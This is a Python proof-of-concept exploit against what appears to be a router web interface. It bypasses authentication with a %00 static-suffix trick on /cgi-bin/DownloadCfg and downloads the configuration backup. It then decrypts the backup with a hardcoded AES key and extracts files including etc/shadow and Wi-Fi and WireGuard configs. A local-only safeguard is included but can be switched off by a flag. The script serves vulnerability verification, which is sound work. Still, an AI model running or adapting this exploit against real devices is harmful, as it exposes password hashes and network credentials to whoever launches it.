#!/usr/bin/env python3
"""
PoC: unauthenticated config backup download via %00 static-suffix auth bypass.
"""

import argparse
import hashlib
import io
import ipaddress
import os
from pathlib import Path
from pathlib import PurePosixPath
import shutil
import socket
import subprocess
import sys
import tarfile
import urllib.error
import urllib.parse
import urllib.request

CONFIG_BACKUP_KEY = "4008dfec3c0e98c406b50f8749924008"
SENSITIVE_PATHS = (
    "etc/config/wireless",
    "etc/config/pub",
    "etc/config/cwmp",
    "etc/config/wireguard",
    "etc/passwd",
    "etc/shadow",
)


class DecodeError(Exception):
    pass


def require_private_target(base_url, allow_nonlocal):
    host = urllib.parse.urlparse(base_url).hostname
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    if not allow_nonlocal and not (ip.is_loopback or ip.is_private):
        raise SystemExit(f"refusing non-private target {ip}; pass --allow-nonlocal for authorized testing")


def get(base_url, path):
    req = urllib.request.Request(base_url.rstrip("/") + path, method="GET")
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=8) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers), exc.read()


def mkdir_private(path):
    old_umask = os.umask(0o077)
    try:
        path.mkdir(parents=True, exist_ok=True)
    finally:
        os.umask(old_umask)


def safe_member_name(name):
    posix = PurePosixPath(name)
    return name and not posix.is_absolute() and ".." not in posix.parts


def extract_regular_member(tar, member, extract_dir):
    if not safe_member_name(member.name):
        raise DecodeError(f"unsafe tar member path: {member.name!r}")

    target = extract_dir.joinpath(*PurePosixPath(member.name).parts)
    if member.isdir():
        target.mkdir(parents=True, exist_ok=True)
        return True

    if not member.isfile():
        return False

    source = tar.extractfile(member)
    if source is None:
        return False

    target.parent.mkdir(parents=True, exist_ok=True)
    with source, target.open("wb") as dst:
        shutil.copyfileobj(source, dst)
    os.chmod(target, member.mode & 0o777)
    return True


def decode_config_backup(encrypted_path, decode_dir):
    mkdir_private(decode_dir)

    try:
        proc = subprocess.run(
            [
                "openssl",
                "enc",
                "-d",
                "-aes-128-ecb",
                "-K",
                CONFIG_BACKUP_KEY,
                "-in",
                str(encrypted_path),
            ],
            check=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
    except FileNotFoundError as exc:
        raise DecodeError("openssl CLI not found; install openssl or pass --no-decode") from exc

    if proc.returncode != 0:
        stderr = proc.stderr.decode("utf-8", errors="replace").strip()
        raise DecodeError(f"openssl decrypt failed: {stderr or f'exit {proc.returncode}'}")

    plaintext = proc.stdout
    try:
        md5_line, product_line, tarball = plaintext.split(b"\n", 2)
    except ValueError as exc:
        raise DecodeError("decrypted backup does not contain the expected two-line header") from exc

    try:
        expected_md5 = md5_line.decode("ascii")
        product = product_line.decode("ascii")
    except UnicodeDecodeError as exc:
        raise DecodeError("decrypted header is not ASCII") from exc

    if len(expected_md5) != 32 or any(c not in "0123456789abcdefABCDEF" for c in expected_md5):
        raise DecodeError(f"invalid embedded MD5 header: {expected_md5!r}")

    actual_md5 = hashlib.md5(tarball).hexdigest()
    if expected_md5.lower() != actual_md5:
        raise DecodeError(f"embedded MD5 mismatch: header={expected_md5} payload={actual_md5}")

    decrypted_path = decode_dir / "decrypted.bin"
    tarball_path = decode_dir / "config.tgz"
    listing_path = decode_dir / "files.txt"
    extract_dir = decode_dir / "extracted"

    decrypted_path.write_bytes(plaintext)
    tarball_path.write_bytes(tarball)
    mkdir_private(extract_dir)

    with tarfile.open(fileobj=io.BytesIO(tarball), mode="r:gz") as tar:
        members = tar.getmembers()
        names = [member.name for member in members]
        listing_path.write_text("\n".join(names) + "\n", encoding="utf-8")
        extracted_count = sum(extract_regular_member(tar, member, extract_dir) for member in members)

    sensitive_present = [path for path in SENSITIVE_PATHS if path in names]
    return {
        "decrypted_path": decrypted_path,
        "decrypted_bytes": len(plaintext),
        "tarball_path": tarball_path,
        "tarball_bytes": len(tarball),
        "listing_path": listing_path,
        "extract_dir": extract_dir,
        "product": product,
        "md5": actual_md5,
        "file_count": len(names),
        "extracted_count": extracted_count,
        "sensitive_present": sensitive_present,
    }


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:18080")
    parser.add_argument("--out", default="poc_out/download_cfg_noauth.bin")
    parser.add_argument("--decode-dir", default="poc_out/download_cfg_decoded")
    parser.add_argument("--no-decode", action="store_true")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()

    require_private_target(args.target, args.allow_nonlocal)
    baseline_status, baseline_headers, baseline_body = get(args.target, "/cgi-bin/DownloadCfg")
    status, headers, body = get(args.target, "/cgi-bin/DownloadCfg%00.js")

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_bytes(body)
    digest = hashlib.sha256(body).hexdigest()
    baseline_download = baseline_status == 200 and len(baseline_body) > 1024
    exploit_download = status == 200 and len(body) > 1024
    nul_suffix_bypass = baseline_status in (301, 302, 303, 307, 308) and exploit_download
    decoded_ok = False

    print("[baseline] GET /cgi-bin/DownloadCfg")
    print(f"  status={baseline_status} location={baseline_headers.get('Location', '')} bytes={len(baseline_body)}")
    print("[exploit] GET /cgi-bin/DownloadCfg%00.js")
    print(f"  status={status} content_type={headers.get('Content-Type', '')} bytes={len(body)} sha256={digest}")
    print(f"  saved={out}")

    if exploit_download and not args.no_decode:
        print("[decode] AES-128-ECB config wrapper")
        try:
            decoded = decode_config_backup(out, Path(args.decode_dir))
        except DecodeError as exc:
            print(f"  decode_failed={exc}")
        else:
            decoded_ok = True
            print(f"  decrypted={decoded['decrypted_path']} bytes={decoded['decrypted_bytes']}")
            print(f"  product={decoded['product']}")
            print(f"  payload_md5={decoded['md5']} verified=True")
            print(f"  tarball={decoded['tarball_path']} bytes={decoded['tarball_bytes']}")
            print(f"  listing={decoded['listing_path']} files={decoded['file_count']}")
            print(f"  extracted={decoded['extract_dir']} files={decoded['extracted_count']}")
            print("  sensitive_paths=" + ",".join(decoded["sensitive_present"]))

    vulnerable = nul_suffix_bypass or baseline_download or decoded_ok
    print("  nul_suffix_bypass=" + str(nul_suffix_bypass))
    print("  baseline_download=" + str(baseline_download))
    if baseline_download and not nul_suffix_bypass:
        print("  note=baseline route already returned a backup; this runtime may be first-run/unconfigured or already authenticated, so it does not isolate the %00 bypass")
    print("  vulnerable=" + str(vulnerable))
    if vulnerable:
        print("  cvss evidence: AV:N/AC:L/PR:N/UI:N/C:H; protected config backup is downloadable without auth")

    sys.exit(0 if vulnerable else 1)


if __name__ == "__main__":
    main()
